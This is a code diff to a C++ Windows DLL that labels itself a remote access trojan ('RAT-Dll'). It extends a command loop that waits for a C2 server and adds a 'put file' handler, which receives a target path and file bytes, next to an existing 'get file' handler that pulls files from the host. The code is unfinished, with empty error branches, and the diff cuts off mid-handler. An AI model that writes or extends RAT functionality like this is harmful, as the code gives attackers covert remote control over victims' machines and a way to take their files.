@@ -98,17 +98,39 @@ INT startListen()
 
     // Receive from client until the peer shuts down the connection
         // From here is where we are currently controling RAT functionality, i.e., we wait for commands and then call the appropiate handler and return to wait for more commands 
+        // TODO: Separate each conditional into its own function... probably in its respective cpp file 
     do
     {
         OutputDebugStringA("RAT-Dll::startListen - Connection from C2 recieved! Waiting for command... \n");
         status = recv(clientSock, recvBuf, recvBufLen, 0);
         if (status > 0)
         {
-             // Add put file here...
+             // C2 told us to put a file so lets get the file contents first 
+            if (strcmp((const char*)&recvBuf, PUT) == 0)
+            {
+                // Get the file path
+                status = recv(clientSock, recvBuf, recvBufLen, 0);
+                if (status == SOCKET_ERROR)
+                {
+                    // error out instead here....
+
+
+                }
+
+
+                sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Performing put file on path %s...\n", recvBuf);
+                OutputDebugStringA(msgBuf);
+
+                // Get the actual file bytes
+                status = recv(clientSock, recvBuf, recvBufLen, 0);
+
+
+            }
 
             // C2 told us to get a file so lets get the file path first 
-             if (strcmp((const char*)&recvBuf, GET) == 0)
+             else if (strcmp((const char*)&recvBuf, GET) == 0)
              {
+                // Receive our file path 
                  status = recv(clientSock, recvBuf, recvBufLen, 0);
                  if (status != SOCKET_ERROR)
                  {
